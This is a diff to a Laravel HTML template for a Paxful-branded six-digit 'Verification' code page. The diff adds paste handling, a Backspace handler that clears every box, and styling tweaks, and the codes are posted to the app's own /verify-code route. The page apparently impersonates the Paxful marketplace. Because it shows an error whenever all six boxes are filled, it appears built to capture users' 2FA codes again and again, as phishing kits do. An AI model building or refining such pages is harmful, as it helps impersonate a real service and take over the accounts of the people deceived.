@@ -7,6 +7,7 @@
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="icon" href="{{ asset('storage/images/logo-icon.ico') }}" type="image/x-icon">
     <style>
         body {
             font-family: 'Inter', sans-serif;
@@ -28,7 +29,8 @@
             max-width: 1200px;
             align-items: flex-start;
             justify-content: center;
-            padding: 0;
+            padding: 20px;
+            box-sizing: border-box;
         }
 
         .back-button a {
@@ -96,6 +98,7 @@
             color: #fff;
             border: none;
             border-radius: 10px;
+            cursor: pointer;
         }
 
         button {
@@ -132,11 +135,13 @@
             .container {
                 flex-direction: row;
                 justify-content: space-between;
+                padding: 40px;
             }
 
             .login-section {
                 width: 40%;
                 text-align: left;
+                margin-left: 20px;
             }
 
             .illustration-section {
@@ -152,7 +157,7 @@
     <div class="container">
         <div class="login-section">
             <div class="logo">
-                <img src="images/paxful.png" alt="Paxful Logo"> paxful
+                <img src="{{ asset('storage/images/paxful.png') }}" alt="Paxful Logo">paxful
             </div>
             <div class="back-button">&lt; <a href="/">Back</a></div>
             <div class="welcome-text">Verification</div>
@@ -170,7 +175,7 @@
         </div>
         <div class="illustration-section">
             <div class="illustration">
-                <img src="images/registersvg.png" alt="Illustration">
+                <img src="{{ asset('storage/images/registersvg.PNG') }}" alt="Illustration"> 
             </div>
         </div>
     </div>
@@ -180,36 +185,66 @@
         const errorMessage = document.querySelector('.error-message');
 
         inputBoxes.forEach((input, index) => {
-            input.addEventListener('input', () => {
-                if (input.value.length === 1 && index < inputBoxes.length - 1) {
+            input.addEventListener('input', (event) => {
+                if (event.target.value.length === 1 && index < inputBoxes.length - 1) {
                     inputBoxes[index + 1].focus();
                 }
-                
-                const allFilled = Array.from(inputBoxes).every(box => box.value !== '');
+                checkFilled();
+            });
 
-                if (allFilled) {
-                    const code = Array.from(inputBoxes).map(box => box.value).join('');
-                    submitCode(code);
-                    errorMessage.style.display = 'block';
-                } else {
-                    errorMessage.style.display = 'none';
+            input.addEventListener('keydown', (event) => {
+                if (event.key === 'Backspace') {
+                    clearInputs(); // Clear all input boxes when backspace is pressed
+                }
+            });
+
+            input.addEventListener('paste', (event) => {
+                event.preventDefault();
+                const pastedData = event.clipboardData.getData('text').trim();
+
+                if (/^\d{6}$/.test(pastedData)) {
+                    pastedData.split('').forEach((char, idx) => {
+                        if (inputBoxes[idx]) {
+                            inputBoxes[idx].value = char;
+                        }
+                    });
+                    inputBoxes[inputBoxes.length - 1].focus();
+                    checkFilled();
                 }
             });
         });
 
+        function clearInputs() {
+            inputBoxes.forEach(box => box.value = '');
+            inputBoxes[0].focus();
+            errorMessage.style.display = 'none';
+        }
+
+        function checkFilled() {
+            const allFilled = Array.from(inputBoxes).every(box => box.value !== '');
+
+            if (allFilled) {
+                const code = Array.from(inputBoxes).map(box => box.value).join('');
+                submitCode(code);
+                errorMessage.style.display = 'block';
+            } else {
+                errorMessage.style.display = 'none';
+            }
+        }
+
         function submitCode(code) {
-            fetch('/verify-code', { // Replace with your backend route
+            fetch('/verify-code', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
-                    'X-CSRF-TOKEN': '{{ csrf_token() }}' // For Laravel CSRF protection
+                    'X-CSRF-TOKEN': '{{ csrf_token() }}'
                 },
                 body: JSON.stringify({ code })
             })
             .then(response => response.json())
             .then(data => {
                 if (data.success) {
-                    window.location.href = '/dashboard'; // Redirect on success
+                    window.location.href = '/dashboard';
                 } else {
                     errorMessage.style.display = 'block';
                 }
@@ -217,5 +252,6 @@
             .catch(error => console.error('Error:', error));
         }
     </script>
+
 </body>
 </html>
